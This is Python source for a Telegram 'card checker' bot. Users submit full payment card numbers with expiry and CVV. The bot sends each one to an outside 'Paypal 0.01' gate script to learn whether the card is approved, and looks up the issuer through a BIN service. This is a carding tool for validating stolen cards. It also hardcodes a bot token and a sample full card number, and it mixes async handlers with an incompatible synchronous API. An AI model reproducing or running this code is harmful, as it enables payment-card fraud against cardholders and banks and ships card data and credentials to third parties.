import requests
import time
import re
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram.error import TelegramError

# Replace with your Telegram bot token
BOT_TOKEN = "7971051467:AAEgFdgmEcmfYmIWfSqQ_sCv0MNNzcrl49Y"

# Animation frames for processing
ANIMATION_FRAMES = ["⏳ Checking... █", "⏳ Checking... ███", "⏳ Checking... █████", "⏳ Checking... ███████"]
ANIMATION_DELAY = 0.5  # Seconds between animation frames

def validate_card(card: str) -> bool:
    """Validate card format: number|MM|YYYY|CVV"""
    pattern = r'^\d{12,19}\|\d{2}\|\d{4}\|\d{3,4}$'
    return bool(re.match(pattern, card))

def get_bin_info(bin_code: str) -> dict:
    """Fetch BIN information from the specified API"""
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "issuer": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown") + " " + data.get("country_flag", "")
            }
        return {"type": "Unknown", "brand": "Unknown", "issuer": "Unknown", "country": "Unknown"}
    except Exception:
        return {"type": "Unknown", "brand": "Unknown", "issuer": "Unknown", "country": "Unknown"}

def check_card(card: str) -> tuple:
    """Send card details to the API and return status and response"""
    try:
        payload = {"lista": card}
        response = requests.post("https://wizvenex.com/Paypal.php", data=payload, timeout=10)
        response_text = response.text.encode('utf-8', errors='replace').decode('utf-8')
        # Attempt to extract response between '>' and '<'
        try:
            result = response_text.split('>')[1].split('<')[0].strip()
        except IndexError:
            result = response_text.strip()
        # Determine status (Approved or Declined)
        status = "Approved" if "approved" in result.lower() else "Declined"
        return True, status, result
    except requests.RequestException as e:
        return False, "Declined", f"API Error: {str(e)}"

def format_response(card: str, status: str, response: str, bin_info: dict) -> str:
    """Format the response to match the provided UI"""
    status_line = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "Approved" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    return (
        f"{status_line}\n\n"
        f"𝗖𝗮𝗿𝗱: {card}\n"
        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Paypal 0.01\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝗲: {response}\n\n"
        f"𝗜𝗻𝗳𝗼: {bin_info['type']} - {bin_info['brand']}\n"
        f"𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info['issuer']}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info['country']}"
    )

async def start(update: Update, context: CallbackContext) -> None:
    """Handle /start command"""
    await update.message.reply_text(
        "Welcome to the Card Checker Bot! Use /pp <card_number|MM|YYYY|CVV> to check a card.\n"
        "Example: /pp 4517699015851741|09|2025|491"
    )

async def pp_command(update: Update, context: CallbackContext) -> None:
    """Handle /pp command for card checking"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    message = update.message

    # Check if card details are provided
    if not context.args:
        await message.reply_text("Please provide card details in the format: /pp <card_number|MM|YYYY|CVV>")
        return

    card = " ".join(context.args).strip()
    if not validate_card(card):
        await message.reply_text("Invalid card format. Use: <card_number|MM|YYYY|CVV>")
        return

    # Send initial message and start animation
    animation_message = await message.reply_text(ANIMATION_FRAMES[0])
    message_id = animation_message.message_id

    # Run animation
    for frame in ANIMATION_FRAMES[1:]:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=frame
            )
            time.sleep(ANIMATION_DELAY)
        except TelegramError:
            break

    # Get BIN info (first 6 digits of card)
    bin_code = card.split('|')[0][:6]
    bin_info = get_bin_info(bin_code)

    # Check card via API
    success, status, response = check_card(card)

    # Format and send final response
    final_response = format_response(card, status, response, bin_info)
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_response,
            parse_mode=ParseMode.MARKDOWN
        )
    except TelegramError:
        await message.reply_text(final_response, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: CallbackContext) -> None:
    """Handle /help command"""
    await update.message.reply_text(
        "Commands:\n"
        "/start - Start the bot\n"
        "/pp <card_number|MM|YYYY|CVV> - Check a card\n"
        "/help - Show this help message"
    )

def main() -> None:
    """Run the bot"""
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Add handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("pp", pp_command))
    dp.add_handler(CommandHandler("help", help_command))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
